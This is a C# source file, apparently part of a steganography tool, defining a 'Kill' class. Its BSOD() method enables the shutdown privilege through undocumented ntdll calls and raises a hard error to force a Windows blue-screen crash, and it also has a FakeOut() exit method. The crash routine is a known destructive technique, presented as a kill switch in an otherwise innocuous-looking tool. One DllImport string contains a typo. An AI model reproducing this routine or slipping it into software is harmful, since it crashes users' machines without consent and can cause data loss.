﻿using System.Runtime.InteropServices;

namespace SteganoTool
{
    internal class Kill
    {
        internal static void BSOD()
        {
            RtlAdjustPrivilege(Privilege.SeShutdownPrivilege, true, false, out bool previousValue);
            NtRaiseHardError(NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, NTStatus.STATUS_SUCCESS,
                out uint Response);
        }

        internal static void FakeOut()
        {
            Application.Exit();
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        internal static extern IntPtr RtlAdjustPrivilege(Privilege privilege, bool bEnablePrivilege, bool IsThreadPrivilege,
            out bool PreviousValue);

        internal enum Privilege : int
        {
            SeCreateTokenPrivilege = 1,
            SeAssignPrimaryTokenPrivilege = 2,
            SeLockMemoryPrivilege = 3,
            SeIncreaseQuotaPrivilege = 4,
            SeUnsolicitedInputPrivilege = 5,
            SeMachineAccountPrivilege = 6,
            SeTcbPrivilege = 7,
            SeSecurityPrivilege = 8,
            SeTakeOwnershipPrivilege = 9,
            SeLoadDriverPrivilege = 10,
            SeSystemProfilePrivilege = 11,
            SeSystemtimePrivilege = 12,
            SeProfileSingleProcessPrivilege = 13,
            SeIncreaseBasePriorityPrivilege = 14,
            SeCreatePagefilePrivilege = 15,
            SeCreatePermanentPrivilege = 16,
            SeBackupPrivilege = 17,
            SeRestorePrivilege = 18,
            SeShutdownPrivilege = 19,
            SeDebugPrivilege = 20,
            SeAuditPrivilege = 21,
            SeSystemEnvironmentPrivilege = 22,
            SeChangeNotifyPrivilege = 23,
            SeRemoteShutdownPrivilege = 24,
            SeUndockPrivilege = 25,
            SeSyncAgentPrivilege = 26,
            SeEnableDelegationPrivilege = 27,
            SeManageVolumePrivilege = 28,
            SeImpersonatePrivilege = 29,
            SeCreateGlobalPrivilege = 30,
            SeTrustedCredManAccessPrivilege = 31,
            SeRelabelPrivilege = 32,
            SeIncreaseWorkingSetPrivilege = 33,
            SeTimeZonePrivilege = 34,
            SeCreateSymbolicLinkPrivilege = 35
        }

        [DllImport("ntdll.dll)")]
        internal static extern uint NtRaiseHardError(NTStatus ErrorStatus, uint NumberOfParameters,
            uint UnicodeStringParameterMask, IntPtr Parameters, NTStatus ValidResponseOption, out uint Response);

        internal enum NTStatus : uint
        {
            STATUS_SUCCESS = 0x00000000,
            STATUS_WAIT_0 = 0x00000000,
            STATUS_WAIT_1 = 0x00000001,
            STATUS_WAIT_2 = 0x00000002,
            STATUS_WAIT_3 = 0x00000003,
            STATUS_WAIT_63 = 0x0000003F,
            STATUS_ABANDONED = 0x00000080,
            STATUS_ABANDONED_WAIT_0 = 0x00000080,
            STATUS_ABANDONED_WAIT_63 = 0x000000BF,
            STATUS_USER_APC = 0x000000C0,
            STATUS_KERNEL_APC = 0x00000100,
            STATUS_ALERTED = 0x00000101,
            STATUS_TIMEOUT = 0x00000102,
            STATUS_PENDING = 0x00000103,
            STATUS_REPARSE = 0x00000104,
            STATUS_CRASH_DUMP = 0x00000116,
            DBG_EXCEPTION_HANDLED = 0x00010001,
            DBG_CONTINUE = 0x00010002,
            STATUS_PRIVILEGED_INSTRUCTION = 0xC0000096,
            STATUS_MEMORY_NOT_ALLOCATED = 0xC00000A0,
            STATUS_BIOS_FAILED_TO_CONNECT_INTERRUPT = 0xC000016E,
            STATUS_ASSERTION_FAILURE = 0xC0000420
        }
    }
}
